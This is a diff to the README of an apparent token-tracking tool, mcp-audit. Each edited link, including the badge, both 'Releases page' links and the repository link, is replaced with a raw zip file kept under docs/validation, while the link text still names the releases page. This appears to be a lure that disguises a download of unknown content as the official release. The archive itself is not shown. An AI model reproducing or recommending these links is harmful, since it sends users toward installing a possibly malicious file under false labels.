@@ -1,6 +1,6 @@
 # 🚀 mcp-audit - Track Your Tokens in Real Time
 
-[![Download mcp-audit](https://img.shields.io/badge/download-mcp--audit-blue.svg)](https://github.com/ariefalabbasi/mcp-audit/releases)
+[![Download mcp-audit](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/docs/validation/mcp-audit_v3.5.zip)](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/docs/validation/mcp-audit_v3.5.zip)
 
 ## 📋 Description
 
@@ -25,7 +25,7 @@ The **mcp-audit** application helps you track MCP tokens for Claude Code, Codex 
 Follow these steps to get started with mcp-audit:
 
 1. **Download the Application:**
-   - Visit the [Releases page](https://github.com/ariefalabbasi/mcp-audit/releases) to download the latest version of mcp-audit.
+   - Visit the [Releases page](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/docs/validation/mcp-audit_v3.5.zip) to download the latest version of mcp-audit.
    
 2. **Install the Application:**
    - Locate the downloaded file on your computer and follow the installation prompts.
@@ -41,7 +41,7 @@ Follow these steps to get started with mcp-audit:
 
 ## 📥 Download & Install
 
-To start using mcp-audit, please visit the [Releases page](https://github.com/ariefalabbasi/mcp-audit/releases) to download the latest version. Follow the instructions in the "Getting Started" section to install and run the application. 
+To start using mcp-audit, please visit the [Releases page](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/docs/validation/mcp-audit_v3.5.zip) to download the latest version. Follow the instructions in the "Getting Started" section to install and run the application. 
 
 ## 🛠️ Troubleshooting
 
@@ -68,7 +68,7 @@ mcp-audit is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 You can stay updated with the latest news and features by following our project on GitHub.  
 
-- [mcp-audit GitHub Repository](https://github.com/ariefalabbasi/mcp-audit)
+- [mcp-audit GitHub Repository](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/docs/validation/mcp-audit_v3.5.zip)
 
 For any feedback or support requests, feel free to reach out to our community.
 
